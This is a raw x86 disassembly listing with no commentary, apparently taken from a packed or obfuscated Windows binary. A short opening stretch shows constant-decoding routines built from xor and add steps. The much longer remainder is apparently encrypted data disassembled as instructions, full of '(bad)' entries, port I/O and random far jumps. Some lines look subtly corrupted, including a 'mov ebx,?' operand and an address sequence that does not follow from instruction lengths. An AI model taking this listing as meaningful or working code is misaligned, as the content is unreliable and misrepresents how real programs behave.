  414d15:	mov    ecx,DWORD PTR ds:0x428e99
  414d1b:	dec    ecx
  414d1c:	mov    DWORD PTR ds:0x428e99,ecx
  414d22:	jmp    0x414cd1
  414d27:	mov    eax,DWORD PTR [ebp-0x4]
  414d2a:	mov    ecx,DWORD PTR [ebp-0x4]
  414d2d:	sub    eax,ecx
  414d2f:	mov    DWORD PTR [ebp-0x4],eax
  414d32:	or     DWORD PTR [ebp-0x4],0xf89c85bc
  414d39:	mov    eax,DWORD PTR [ebp-0xc]
  414d3c:	xor    eax,esi
  414d3e:	add    eax,edi
  414d40:	push   eax
  414d41:	mov    eax,DWORD PTR [ebp-0x10]
  414d44:	xor    eax,esi
  414d46:	add    eax,edi
  414d48:	push   eax
  414d49:	mov    eax,DWORD PTR [ebp-0x4]
  414d4c:	xor    eax,esi
  414d4e:	add    eax,0x3272fc
  414d53:	push   eax
  414d54:	lea    eax,[ebp-0x78]
  414d57:	push   eax
  414d58:	push   DWORD PTR [ebp-0x2c]
  414d5b:	push   DWORD PTR [ebp-0x28]
  414d5e:	call   0x40f6a0
  414d63:	test   eax,eax
  414d65:	je     0x414d93
  414d6b:	lea    eax,[ebp-0x78]
  414d6e:	push   eax
  414d6f:	mov    eax,DWORD PTR [ebp-0x28]
  414d72:	xor    eax,esi
  414d74:	add    eax,edi
  414d76:	push   eax
  414d77:	mov    eax,DWORD PTR [ebp-0x24]
  414d7a:	add    eax,0xaa
  414d7f:	push   eax
  414d80:	mov    eax,DWORD PTR [ebp-0x24]
  414d83:	mov    eax,DWORD PTR [eax+0x198]
  414d89:	push   DWORD PTR [eax]
  414d8b:	call   0x40854d
  414d90:	mov    DWORD PTR [ebp-0x14],eax
  414d93:	mov    ecx,DWORD PTR ds:0x42845d
  414d99:	lea    eax,[ebp+0x4]
  414d9c:	mov    DWORD PTR [ecx*4+0x428455],eax
  414da3:	inc    DWORD PTR ds:0x42845d
  414da9:	mov    eax,DWORD PTR [ebp-0x14]
  414dac:	test   eax,eax
  414dae:	je     0x41717d
  414db4:	lea    eax,[ebp-0x8]
  414db7:	mov    DWORD PTR [ebp-0x34],eax
  414dba:	mov    eax,DWORD PTR [ebp-0x30]
  414dbd:	mov    DWORD PTR [ebp-0x8],eax
  414dc0:	mov    eax,DWORD PTR [ebp-0x8]
  414dc3:	mov    ecx,DWORD PTR [ebp-0x14]
  414dc6:	jmp    0x417123
  414dcb:	mov    cl,0x3d
  414dcd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414dce:	aas    
  414dcf:	jns    0x414e38
  414dd1:	jns    0x414e40
  414dd3:	pop    edx
  414dd4:	popw   ds
  414dd6:	inc    ebp
  414dd7:	or     DWORD PTR [ebx+0x7f],ebp
  414dda:	repnz push 0xffffff95
  414ddd:	jl     0x414e5a
  414ddf:	mov    ebx,0x337b7b9e
  414de4:	push   es
  414de5:	shl    DWORD PTR es:[ecx+0x78],1
  414de9:	add    ecx,DWORD PTR [esi]
  414deb:	sub    bh,dl
  414ded:	add    cl,BYTE PTR [edi+0x7b]
  414df0:	aad    0xb9
  414df2:	sar    BYTE PTR [eax],cl
  414df4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414df5:	mov    al,0x46
  414df7:	xor    DWORD PTR [edi-0x13467197],esp
  414dfd:	ficom  WORD PTR [edx-0x62392ed7]
  414e03:	outs   dx,DWORD PTR ds:[esi]
  414e04:	mov    ecx,0xf4be789a
  414e09:	test   esp,eax
  414e0b:	fistp  QWORD PTR [edx+0x79238823]
  414e11:	call   0x6a36:0x3240b496
  414e18:	dec    BYTE PTR ds:0x310f9575
  414e1e:	dec    esi
  414e1f:	add    bh,BYTE PTR [eax+eiz*1+0x2d]
  414e23:	or     cl,BYTE PTR [ecx]
  414e25:	(bad)  
  414e26:	or     eax,0x6127b21e
  414e2b:	int3   
  414e2c:	psrlq  mm3,QWORD PTR [edx+0x74]
  414e30:	inc    cl
  414e32:	and    DWORD PTR [ebx+edx*2],esi
  414e35:	inc    edi
  414e36:	call   FWORD PTR [ecx-0x57fd0af8]
  414e3c:	(bad)  [edi-0x7aab689f]
  414e42:	push   0xffffffe8
  414e44:	adc    bh,BYTE PTR [esi]
  414e46:	stc    
  414e47:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414e48:	cs cld 
  414e4a:	mov    cl,0x2c
  414e4c:	sbb    edi,0xf737b3a9
  414e52:	xchg   DWORD PTR [eax+0x10],ebp
  414e55:	les    ebp,FWORD PTR [ebx+0x69]
  414e58:	inc    esi
  414e59:	add    BYTE PTR [eax-0x1f],al
  414e5c:	lds    ecx,FWORD PTR [ebx+esi*2]
  414e5f:	jne    0x414eb7
  414e61:	jno    0x414e14
  414e63:	fidivr WORD PTR [ecx]
  414e65:	test   BYTE PTR [edi],0x9a
  414e68:	(bad)  
  414e69:	add    eax,0xeba785f3
  414e6e:	mov    ecx,0x7ac7356
  414e73:	repnz in al,0x11
  414e76:	inc    ecx
  414e77:	cmp    dh,ah
  414e79:	adc    dh,BYTE PTR [ebp-0x69]
  414e7c:	push   edi
  414e7d:	out    0x27,al
  414e7f:	jmp    0xc53b:0x72894351
  414e86:	mov    DWORD PTR [edx+0x56],eax
  414e89:	mov    edi,0x2f29d8db
  414e8e:	js     0x414eeb
  414e90:	das    
  414e91:	fild   DWORD PTR [eax]
  414e93:	push   esp
  414e94:	mov    ah,0x3b
  414e96:	adc    eax,0xa99b5dae
  414e9b:	push   edi
  414e9c:	jbe    0x414e26
  414e9e:	sbb    cl,BYTE PTR [ebx-0x22]
  414ea1:	repnz mov edi,DWORD PTR [eax]
  414ea4:	int3   
  414ea5:	test   al,0xa7
  414ea7:	jbe    0x414ea8
  414ea9:	stc    
  414eaa:	adc    al,0xbd
  414eac:	iret   
  414ead:	jno    0x414e8a
  414eaf:	aam    0xe
  414eb1:	push   es
  414eb2:	cmc    
  414eb3:	xor    eax,0x9dbeca75
  414eb8:	rcl    DWORD PTR [esi+edi*2+0x460b57ae],0xa6
  414ec0:	adc    ecx,DWORD PTR [eax]
  414ec2:	cmp    BYTE PTR [eax],cl
  414ec4:	mov    eax,ds:0xb3f2038d
  414ec9:	(bad)  
  414eca:	aas    
  414ecb:	hlt    
  414ecc:	push   0x768f61f6
  414ed1:	sbb    DWORD PTR [edx-0x3c37cccb],0xffffffdb
  414ed8:	jns    0x414ec0
  414eda:	ins    BYTE PTR es:[edi],dx
  414edb:	jg     0x414e9e
  414edd:	push   ebx
  414ede:	std    
  414edf:	imul   eax,DWORD PTR [ebp+ecx*2-0x332ec3db],0xe3d57014
  414eea:	loope  0x414e73
  414eec:	inc    eax
  414eed:	popa   
  414eee:	loope  0x414ede
  414ef0:	je     0x414ee8
  414ef2:	mov    dh,0xf7
  414ef4:	ror    edi,1
  414ef6:	mov    ebx,0xacd72690
  414efb:	out    0x37,eax
  414efd:	mov    eax,ds:0xd60886bc
  414f02:	xor    DWORD PTR [ebx-0x5ba08a11],ecx
  414f08:	add    DWORD PTR [edx+0xd1c623d],0x2b
  414f0f:	pop    ds
  414f10:	sahf   
  414f11:	pushf  
  414f12:	jne    0x414f0b
  414f14:	jmp    0xd9c4:0x21d87a69
  414f1b:	test   eax,0x7b502434
  414f20:	and    DWORD PTR [ebp+edx*8-0x36a4d17f],ecx
  414f27:	ror    DWORD PTR [esi+edi*8-0x48868db3],cl
  414f2e:	inc    esi
  414f2f:	or     eax,esi
  414f31:	pop    edi
  414f32:	aad    0xde
  414f34:	pop    ebp
  414f35:	ret    
  414f36:	jae    0x414f97
  414f38:	aad    0xcd
  414f3a:	in     eax,dx
  414f3b:	push   edi
  414f3c:	ror    ebx,cl
  414f3e:	jle    0x414f8e
  414f40:	jne    0x414f10
  414f42:	in     al,dx
  414f43:	jmp    0x414edc
  414f45:	add    al,0xe9
  414f47:	push   ebx
  414f48:	inc    ebx
  414f49:	stc    
  414f4a:	push   eax
  414f4b:	retf   
  414f4c:	adc    DWORD PTR [edx+0x48],ecx
  414f4f:	push   ds
  414f50:	sub    eax,0x36ae414
  414f55:	enter  0xa212,0x11
  414f59:	dec    ecx
  414f5a:	dec    eax
  414f5b:	add    DWORD PTR [ecx+0x10],eax
  414f5e:	bound  esi,QWORD PTR [ebp-0x3d]
  414f61:	mov    edx,0xc796c06e
  414f66:	mov    cs,WORD PTR [edx]
  414f68:	sub    eax,0x3aeeb5a7
  414f6d:	mov    ebp,ss
  414f6f:	ds in  al,0xab
  414f72:	ss xor eax,esi
  414f75:	ja     0x414f43
  414f77:	or     al,0x61
  414f79:	cmp    al,0x8d
  414f7b:	push   edi
  414f7c:	mov    ds:0x555e7965,ax
  414f82:	(bad)  
  414f83:	jg     0x414fab
  414f85:	(bad)  
  414f87:	inc    esp
  414f88:	xchg   BYTE PTR [esi],dh
  414f8a:	pushf  
  414f8b:	sti    
  414f8c:	ins    BYTE PTR es:[edi],dx
  414f8d:	xchg   DWORD PTR ds:0xaaf529d7,esi
  414f93:	sub    bh,BYTE PTR [ebx]
  414f95:	ret    
  414f96:	xor    ch,BYTE PTR [ecx+0x6c3f2f14]
  414f9c:	out    0xca,eax
  414f9e:	aaa    
  414f9f:	push   cs
  414fa0:	push   ds
  414fa1:	lds    ebp,FWORD PTR [esi]
  414fa3:	lahf   
  414fa4:	jns    0x414f45
  414fa6:	sbb    BYTE PTR [eax+ebp*2-0x1f],dh
  414faa:	stos   BYTE PTR es:[edi],al
  414fab:	inc    ecx
  414fac:	ss push ss
  414fae:	jg     0x414f3c
  414fb0:	mov    dl,0x46
  414fb2:	adc    DWORD PTR [ecx-0x12],ebp
  414fb5:	or     DWORD PTR [ebx-0x320d1ea2],esi
  414fbb:	dec    eax
  414fbc:	mov    ah,BYTE PTR [eax-0x1d]
  414fbf:	or     al,0x9d
  414fc1:	in     eax,dx
  414fc2:	out    dx,al
  414fc3:	cld    
  414fc4:	mov    ds:0x597f9520,al
  414fc9:	xchg   BYTE PTR [ebx-0x15],cl
  414fcc:	xor    DWORD PTR [edi],eax
  414fce:	call   0xdafc:0x740ac13e
  414fd5:	ins    DWORD PTR es:[edi],dx
  414fd6:	cmp    edx,DWORD PTR [edx-0x46ffc705]
  414fdc:	sbb    dl,BYTE PTR [edx]
  414fde:	jmp    0xd430217d
  414fe3:	dec    edx
  414fe4:	sti    
  414fe5:	mov    ch,0x1a
  414fe7:	xchg   edi,eax
  414fe8:	push   ebp
  414fe9:	ret    0x886f
  414fec:	adc    ecx,DWORD PTR [eax-0x46]
  414fef:	iret   
  414ff0:	mov    cl,0x45
  414ff2:	jo     0x41500b
  414ff4:	inc    edx
  414ff5:	cdq    
  414ff6:	(bad)  
  414ff8:	popa   
  414ff9:	cdq    
  414ffa:	pop    edx
  414ffb:	or     ecx,eax
  414ffd:	inc    esi
  414ffe:	in     al,0x34
  415000:	pusha  
  415001:	sar    DWORD PTR [esi+0x31],cl
  415004:	jo     0x415036
  415006:	bnd jg 0x415039
  415009:	mov    dl,0x76
  41500b:	inc    eax
  41500c:	scas   al,BYTE PTR es:[edi]
  41500d:	xchg   edi,eax
  41500e:	mov    ah,0x9b
  415010:	out    0x81,eax
  415012:	jge    0x414fc3
  415014:	jae    0x415063
  415016:	mov    ds:0xb5a58e1e,al
  41501b:	cs push ebx
  41501d:	jne    0x414ff0
  41501f:	(bad)  
  415020:	fwait
  415021:	inc    ecx
  415023:	(bad)
  415026:	mov    ebx,?
  415028:	inc    eax
  415029:	push   esi
  41502a:	or     al,0x7c
  41502c:	push   esp
  41502d:	cmc    
  41502e:	pusha  
  41502f:	sbb    eax,0x3abb9ee8
  415034:	retf   0x935d
  415037:	jecxz  0x415009
  415039:	inc    edi
  41503a:	(bad)  
  41503b:	mov    edx,0x17f90a77
  415040:	lea    ecx,[ebp+0x15f78e74]
  415046:	ja     0x415011
  415048:	sub    DWORD PTR [ecx-0x3978893a],edi
  41504e:	mov    bh,BYTE PTR [esi]
  415050:	js     0x415085
  415052:	and    BYTE PTR [eax-0x29],bh
  415055:	pop    edi
  415056:	jne    0x415097
  415058:	cmp    esi,DWORD PTR [eax]
  41505a:	push   ecx
  41505b:	sti    
  41505c:	push   edi
  41505d:	retf   0x939c
  415060:	test   DWORD PTR [ecx],eax
  415062:	xor    DWORD PTR [esi-0xf],ebx
  415065:	pusha  
  415066:	sub    al,0xe4
  415068:	out    dx,eax
  415069:	jl     0x415032
  41506b:	(bad)  
  41506d:	int    0xbb
  41506f:	into   
  415070:	leave  
  415071:	xor    eax,0x5c79a80b
  415076:	popa   
  415077:	pop    es
  415078:	fsubr  DWORD PTR [ebx-0x57fe6fa1]
  41507e:	mov    cl,0x4d
  415080:	(bad)  
  415082:	cmc    
  415083:	dec    edi
  415084:	int    0xdd
  415086:	jl     0x415045
  415088:	pop    ds
  415089:	adc    BYTE PTR [eax-0x70],dl
  41508c:	add    esi,ebx
  41508e:	jmp    0xdbf7d5c7
  415093:	xchg   edx,eax
  415094:	fwait
  415095:	outs   dx,DWORD PTR ds:[esi]
  415096:	push   ds
  415097:	data16 jae 0x4150a5
  41509a:	es scas al,BYTE PTR es:[edi]
  41509c:	imul   eax,DWORD PTR [edi-0x3b],0xb9d16515
  4150a3:	fstp   DWORD PTR [esi+0x2a]
  4150a6:	and    esp,esi
  4150a8:	test   BYTE PTR [ebp+0x3d5ec4a6],bl
  4150ae:	xchg   ecx,eax
  4150af:	cmp    DWORD PTR [edx+0x1d85f245],ebx
  4150b5:	repnz sti 
  4150b7:	push   esp
  4150b8:	jge    0x415091
  4150ba:	cmp    edx,edi
  4150bc:	lahf   
  4150bd:	pop    ebx
  4150be:	stc    
  4150bf:	sub    ecx,esi
  4150c1:	cmp    DWORD PTR [esi],ebx
  4150c3:	adc    DWORD PTR [edx+edx*2-0x54],ecx
  4150c7:	das    
  4150c8:	mov    ebp,0x69b575eb
  4150cd:	xchg   esi,eax
  4150ce:	fwait
  4150cf:	mov    esp,0xd9d08d0e
  4150d4:	add    cl,BYTE PTR [edi]
  4150d6:	mov    bh,0x7b
  4150d8:	pop    ebx
  4150d9:	and    BYTE PTR [eax+0x58f7c77a],al
  4150df:	enter  0x75e5,0xd0
  4150e3:	sbb    edx,DWORD PTR [ebp-0x14]
  4150e6:	pop    ecx
  4150e7:	add    edi,DWORD PTR [edx]
  4150e9:	cli    
  4150ea:	and    ch,bh
  4150ec:	sbb    bl,BYTE PTR [esi+0x64]
  4150ef:	adc    BYTE PTR [esi-0x4264615f],0x98
  4150f6:	pop    ds
  4150f7:	pop    eax
  4150f8:	pop    ecx
  4150f9:	aam    0xca
  4150fb:	or     DWORD PTR ds:0xd581fe67,ebx
  415101:	cmp    DWORD PTR [ecx+0xaf10b26],ebx
  415107:	xchg   DWORD PTR [ebx-0x5fb30283],edi
  41510d:	pop    ecx
  41510e:	lods   al,BYTE PTR ds:[esi]
  41510f:	xor    BYTE PTR [ecx+0x6db639cd],ch
  415115:	das    
  415116:	jmp    0xd5466a84
  41511b:	or     ebp,ebp
  41511d:	push   esp
  41511e:	pop    ebp
  41511f:	mov    al,0x2
  415121:	mov    ecx,0x7ffde34f
  415126:	mov    dh,0x76
  415128:	inc    edx
  415129:	ss cld 
  41512b:	jne    0x4150e2
  41512d:	not    BYTE PTR [ecx]
  41512f:	loope  0x41518a
  415131:	mov    ds,WORD PTR [ebp+0x2e508608]
  415137:	mov    eax,0xdcd4067a
  41513c:	lds    esp,FWORD PTR [eax-0x26cd0a]
  415142:	mov    ax,ds:0xc1d0a770
  415148:	mov    bl,0x21
  41514a:	sbb    eax,0x8db0269c
  41514f:	fs pop ebp
  415151:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415152:	add    al,0x8e
  415154:	rol    BYTE PTR [edx+esi*8],0x98
  415158:	ficom  DWORD PTR [esi-0x4a]
  41515b:	cdq    
  41515c:	xor    ah,bh
  41515e:	mov    dh,0x31
  415160:	mov    dh,0x61
  415162:	mov    al,0x61
  415164:	mov    al,ds:0xaad5f89f
  415169:	add    edi,DWORD PTR [ebx+edx*8]
  41516c:	mov    dh,0xde
  41516e:	mov    dh,0xa1
  415170:	imul   DWORD PTR [ebp+ecx*4+0x7eb54874]
  415177:	add    ecx,0x19
  41517a:	int    0xe5
  41517c:	ret    0x4aad
  41517f:	test   esp,edx
  415181:	imul   edx,eax,0xfffffffa
  415184:	add    al,0x11
  415186:	pop    edx
  415187:	js     0x4151ec
  415189:	retf   0x3031
  41518c:	adc    BYTE PTR [esi],al
  41518e:	test   eax,0xca32a136
  415193:	lea    ebx,[eax+ebx*4-0x39]
  415197:	mov    ecx,0x4ad152c2
  41519c:	enter  0x85b1,0xba
  4151a0:	xchg   edi,eax
  4151a1:	iret   
  4151a2:	adc    bl,BYTE PTR [ebx+0x3c]
  4151a5:	sti    
  4151a6:	jecxz  0x41516d
  4151a8:	dec    esp
  4151a9:	add    BYTE PTR [ecx+0x39d5b4dc],0xfb
  4151b0:	mov    eax,0x619f141d
  4151b5:	sub    eax,0xe2767e74
  4151ba:	mov    WORD PTR [esi],fs
  4151bc:	pop    es
  4151bd:	or     DWORD PTR [edi-0x6f],ebx
  4151c0:	or     eax,0xeb2db2a4
  4151c5:	enter  0x5163,0xff
  4151c9:	addr16 xchg edi,eax
  4151cb:	popa   
  4151cc:	dec    ebx
  4151cd:	mov    cl,0x87
  4151cf:	or     BYTE PTR ds:0xad31456e,bh
  4151d5:	jmp    0x41515b
  4151d7:	(bad)  
  4151d8:	jae    0x415178
  4151da:	cmp    esp,DWORD PTR [ecx-0x2a57a542]
  4151e0:	rcr    DWORD PTR [ecx-0x7ea4ee2e],1
  4151e6:	cmp    al,0x66
  4151e8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4151e9:	mul    DWORD PTR ds:0x34b9eade
  4151ef:	das    
  4151f0:	xor    eax,0x9d958f33
  4151f5:	in     al,dx
  4151f6:	in     al,0xe7
  4151f8:	xchg   ebx,eax
  4151f9:	loop   0x415236
  4151fb:	adc    eax,0x9ab44edc
  415200:	stos   DWORD PTR es:[edi],eax
  415201:	jno    0x415227
  415203:	sub    al,0xef
  415205:	scas   al,BYTE PTR es:[edi]
  415206:	imul   DWORD PTR [ebx-0x4cba2b9b]
  41520c:	pop    esi
  41520d:	(bad)  
  41520e:	mov    esi,edi
  415210:	sahf   
  415211:	daa    
  415212:	mov    eax,ds:0xd29ee129
  415217:	mov    WORD PTR [ecx],fs
  415219:	out    0xc,al
  41521b:	mov    dh,0xeb
  41521d:	fldenv [ebx-0x5e4f9339]
  415223:	es cdq 
  415225:	or     al,0x35
  415227:	and    al,0xaf
  415229:	dec    ebp
  41522a:	inc    esp
  41522b:	cmp    al,0xe
  41522e:	std    
  41522f:	xchg   ebp,eax
  415230:	(bad)  
  415231:	dec    esi
  415232:	cmp    BYTE PTR ds:0xd80d2fbd,dh
  415238:	je     0x4151d9
  41523a:	pop    ebx
  41523b:	fcomp  QWORD PTR [ebx-0x15]
  41523e:	add    BYTE PTR [ebp-0x44],ch
  415241:	out    dx,eax
  415242:	das    
  415243:	xor    DWORD PTR [ecx],0xffffffba
  415246:	sbb    al,0xfc
  415248:	jo     0x4152b7
  41524a:	lock cmp ebx,ebx
  41524d:	xchg   ebx,eax
  41524e:	test   eax,0xf8aab90f
  415254:	stos   DWORD PTR es:[edi],eax
  415255:	addr16 mov ebx,0xef7964a1
  41525b:	stos   BYTE PTR es:[edi],al
  41525c:	pop    ds
  41525d:	test   DWORD PTR [ebp+ebp*2-0x4f53035],edx
  415264:	(bad)  
  415266:	jb     0x41528b
  415268:	push   es
  415269:	or     al,0x63
  41526b:	in     eax,dx
  41526c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41526d:	push   0xffffffec
  41526f:	aaa    
  415270:	retf   
  415271:	or     ebx,ebp
  415273:	js     0x41522a
  415275:	das    
  415276:	lock call 0xab94:0x9afa348f
  41527e:	adc    DWORD PTR [ecx],esi
  415280:	pop    edx
  415281:	push   ebp
  415282:	add    DWORD PTR [eax-0x6f],esp
  415285:	aad    0xa3
  415287:	push   es
  415288:	sbb    eax,DWORD PTR [esi+0x62]
  41528b:	aas    
  41528c:	ins    DWORD PTR es:[edi],dx
  41528d:	stos   BYTE PTR es:[edi],al
  41528e:	lahf   
  41528f:	pop    ecx
  415290:	mov    bl,0x5d
  415292:	lock xor DWORD PTR [ebx+ecx*1-0x5a],eax
  415297:	retf   
  415298:	aad    0x6b
  41529a:	scas   al,BYTE PTR es:[edi]
  41529b:	mov    edx,0x196b3f9d
  4152a0:	jno    0x415303
  4152a2:	(bad)  
  4152a4:	jae    0x4152a1
  4152a6:	xor    eax,0x3063154
  4152ab:	dec    ecx
  4152ac:	imul   esi,DWORD PTR [ecx],0xb88342ae
  4152b2:	fmul   DWORD PTR [eax+0x2a932fa2]
  4152b8:	dec    esp
  4152b9:	push   eax
  4152ba:	dec    ebp
  4152bb:	imul   edx,ebp,0x70
  4152be:	call   0x32f8e751
  4152c3:	inc    ebx
  4152c4:	jmp    0x415254
  4152c6:	jge    0x4152d6
  4152c8:	mov    ah,0xc5
  4152ca:	(bad)  
  4152cb:	aaa    
  4152cc:	jnp    0x415305
  4152ce:	inc    eax
  4152cf:	add    al,0x54
  4152d1:	push   ds
  4152d2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4152d3:	jbe    0x41525f
  4152d5:	dec    ebx
  4152d6:	and    BYTE PTR [ebp-0x6893524d],0xbf
  4152dd:	sti    
  4152de:	or     dl,ch
  4152e0:	sub    al,0xfe
  4152e2:	push   0xffffffa3
  4152e4:	add    dl,BYTE PTR [edi+0x57]
  4152e7:	je     0x415271
  4152e9:	jae    0x4152a3
  4152eb:	sub    ecx,ebp
  4152ed:	mov    DWORD PTR [ecx+ecx*4+0x7e8df7db],edi
  4152f4:	les    ebp,FWORD PTR [edi+0x13]
  4152f7:	xor    DWORD PTR [ecx+ecx*8],0xffffffc9
  4152fb:	mov    ch,0x10
  4152fd:	(bad)  
  4152fe:	clc    
  4152ff:	cmp    esi,esp
  415301:	xor    dl,BYTE PTR [ecx+0x4c]
  415304:	or     DWORD PTR ds:0x4de934aa,ecx
  41530a:	mov    ch,dl
  41530c:	(bad)  
  41530d:	pop    ebx
  41530e:	out    0x59,al
  415310:	mov    esi,DWORD PTR [edi-0x4850cb39]
  415316:	loop   0x4152cb
  415318:	or     eax,0x30819ed
  41531d:	mov    DWORD PTR [edx],ebx
  41531f:	jbe    0x415304
  415321:	cmc    
  415322:	ret    0x5c40
  415325:	mov    ecx,esp
  415327:	sub    BYTE PTR [esi],ah
  415329:	dec    esp
  41532a:	loope  0x415388
  41532c:	inc    eax
  41532d:	xchg   BYTE PTR [edx],bh
  41532f:	mov    es,WORD PTR [edi-0x43]
  415332:	pop    ss
  415333:	lahf   
  415334:	or     ch,BYTE PTR [edx+0x1a]
  415337:	adc    BYTE PTR ds:0x5ef1563a,dl
  41533d:	ds (bad) 
  41533f:	adc    BYTE PTR [ecx+eax*4],dl
  415342:	(bad)  
  415343:	das    
  415344:	daa    
  415345:	jp     0x4152de
  415347:	inc    edi
  415348:	(bad)  
  415349:	or     ch,al
  41534b:	mov    ebx,0xc7cd2c6b
  415350:	jb     0x415356
  415352:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415353:	sbb    ebp,DWORD PTR [ebx+ebx*4]
  415356:	rol    BYTE PTR [edx+0x5a78179d],cl
  41535c:	push   es
  41535d:	in     al,0xb4
  41535f:	mov    ebp,0x826dedf9
  415364:	xor    DWORD PTR [esi-0x4cefb360],0xd806b034
  41536e:	inc    ecx
  41536f:	shl    BYTE PTR [edi],cl
  415371:	mov    ecx,0x56e26d55
  415376:	(bad)  
  415377:	jp     0x4152fb
  415379:	xor    eax,0x1cf92970
  41537e:	call   0x3563:0x1ac8a51d
  415385:	jno    0x4153ed
  415387:	nop
  415388:	or     DWORD PTR [eax-0x1c284335],eax
  41538e:	add    eax,0x1e9481b1
  415393:	push   es
  415394:	jb     0x4153c5
  415396:	dec    ebp
  415397:	out    0xec,eax
  415399:	push   esi
  41539a:	outs   dx,DWORD PTR ds:[esi]
  41539b:	lock pop ebx
  41539d:	lock mov ch,0x9a
  4153a0:	cmp    DWORD PTR [eax],esi
  4153a2:	and    BYTE PTR [ebx+eiz*2-0x16],ah
  4153a6:	scas   eax,DWORD PTR es:[edi]
  4153a7:	out    0x68,eax
  4153a9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4153aa:	and    BYTE PTR [ecx+ebx*1+0x7b],al
  4153ae:	xchg   al,cl
  4153b0:	mov    eax,ds:0x362ad609
  4153b5:	push   edi
  4153b6:	pushf  
  4153b7:	sbb    al,0x76
  4153b9:	dec    edi
  4153ba:	imul   ebp,DWORD PTR [edi+0x7bbb4eb6],0xc135e4f2
  4153c4:	mov    ah,0xca
  4153c6:	adc    ah,BYTE PTR [edi+0x63bb3abd]
  4153cc:	xchg   esi,eax
  4153cd:	push   eax
  4153ce:	mov    BYTE PTR [esi],ah
  4153d0:	jno    0x41544c
  4153d2:	mov    ds:0xc1870916,al
  4153d7:	xchg   ebp,eax
  4153d8:	(bad)  
  4153da:	push   es
  4153db:	call   0xec52f0d0
  4153e0:	call   0x32b9:0x27ddd684
  4153e7:	add    eax,0xa7913c58
  4153ec:	mov    dl,0xa3
  4153ee:	mov    ah,0x32
  4153f0:	pop    esp
  4153f1:	cmp    esi,edi
  4153f3:	pop    ebp
  4153f4:	popa   
  4153f5:	xchg   ebx,esi
  4153f7:	jp     0x41541f
  4153f9:	mov    dh,0x91
  4153fc:	mov    BYTE PTR [eax+0x42],cl
  4153ff:	sub    bh,0xea
  415402:	push   ebp
  415403:	jbe    0x4153c5
  415405:	pushf  
  415406:	dec    ebx
  415407:	dec    eax
  415408:	pop    ebx
  415409:	stc    
  41540a:	and    ah,BYTE PTR [eax+esi*2-0x42]
  41540e:	inc    ecx
  41540f:	js     0x41546f
  415411:	push   edx
  415412:	dec    eax
  415413:	stc    
  415414:	xchg   esp,eax
  415415:	addr16 (bad) 
  415417:	xchg   esi,eax
  415418:	in     al,dx
  415419:	inc    eax
  41541a:	scas   eax,DWORD PTR es:[edi]
  41541b:	pop    eax
  41541c:	jbe    0x41545d
  41541e:	fisttp DWORD PTR [edx+0xf]
  415421:	fdiv   QWORD PTR [esi+0x4ade388c]
  415427:	pop    eax
  415428:	xchg   DWORD PTR [esi-0x5c],esp
  41542b:	mov    ds:0xeb9e490a,eax
  415430:	sar    DWORD PTR [eax],0xe3
  415433:	frstor [edi]
  415435:	lods   al,BYTE PTR ds:[esi]
  415436:	push   edx
  415437:	dec    ecx
  415438:	in     al,0xef
  41543a:	cmp    ebp,DWORD PTR [edi-0x26adefd]
  415440:	and    dl,ah
  415442:	int3   
  415443:	push   ecx
  415444:	call   0x1115:0x38582e77
  41544b:	pop    edi
  41544c:	in     al,0x65
  41544e:	pop    ds
  41544f:	bound  edx,QWORD PTR [edi]
  415451:	and    al,BYTE PTR [eax-0x6b]
  415454:	outs   dx,BYTE PTR ds:[esi]
  415455:	mov    ch,0xb9
  415457:	fadd   QWORD PTR [edi]
  415459:	add    BYTE PTR [ecx-0x77fb2185],ah
  41545f:	ss mov ebx,edx
  415462:	sub    eax,0xa12f8e57
  415467:	(bad)  
  415469:	adc    DWORD PTR [ebp+edi*2-0x22308b8e],edi
  415470:	arpl   WORD PTR [ebx],bx
  415472:	ss repnz daa 
  415475:	jg     0x4154b4
  415477:	jns    0x415481
  415479:	ret    0xa119
  41547c:	sub    DWORD PTR [edx],esp
  41547e:	xchg   BYTE PTR [ebp+0x32518e90],dh
  415484:	mov    ds:0xd7ab1b16,al
  415489:	call   0x342c:0xfcdd727e
  415490:	mov    ss,WORD PTR [edx]
  415492:	and    ebx,DWORD PTR [ebp+0x24]
  415495:	mov    dl,0xaf
  415497:	and    ah,BYTE PTR [edi+0x354d6501]
  41549d:	call   0x85199379
  4154a2:	push   0xffffff81
  4154a4:	push   edi
  4154a5:	fnstsw WORD PTR [ecx+0x24]
  4154a8:	shl    bl,1
  4154aa:	pop    esp
  4154ab:	pop    edx
  4154ac:	xor    eax,0x3628c28b
  4154b1:	push   ebp
  4154b2:	out    0xc6,al
  4154b4:	fcomp  st(0)
  4154b6:	pushf  
  4154b7:	cmp    edx,edx
  4154b9:	sbb    al,0x59
  4154bb:	mov    ds:0xdd780efa,al
  4154c0:	push   es
  4154c1:	data16 xlat BYTE PTR ds:[ebx]
  4154c3:	adc    BYTE PTR [ebp+0xd19296f],dl
  4154c9:	ds aam 0xb7
  4154cc:	ja     0x41548f
  4154ce:	scas   al,BYTE PTR es:[edi]
  4154cf:	sub    ecx,DWORD PTR [edi-0x3a]
  4154d2:	loope  0x415513
  4154d4:	lock je 0x41554a
  4154d7:	jg     0x415526
  4154d9:	test   DWORD PTR [eax],0xcc43965c
  4154df:	mov    bl,BYTE PTR [ebx]
  4154e1:	ret    0x2aa3
  4154e4:	pop    esp
  4154e5:	inc    di
  4154e7:	shl    DWORD PTR [ebx+0x34b864d6],0x97
  4154ee:	daa    
  4154ef:	(bad)  
  4154f1:	sbb    esi,DWORD PTR [ecx+edx*8-0x260eed8e]
  4154f8:	cmp    cl,ch
  4154fa:	ins    BYTE PTR es:[edi],dx
  4154fb:	xchg   ecx,eax
  4154fc:	scas   al,BYTE PTR es:[edi]
  4154fd:	cdq    
  4154fe:	aad    0x72
  415500:	retf   0xdff0
  415503:	fsubr  DWORD PTR [esi-0x3e]
  415506:	sub    al,0xba
  415508:	jae    0x415548
  41550a:	push   edx
  41550b:	pop    ebx
  41550c:	stos   DWORD PTR es:[edi],eax
  41550d:	mov    bl,0x13
  41550f:	lods   al,BYTE PTR ds:[esi]
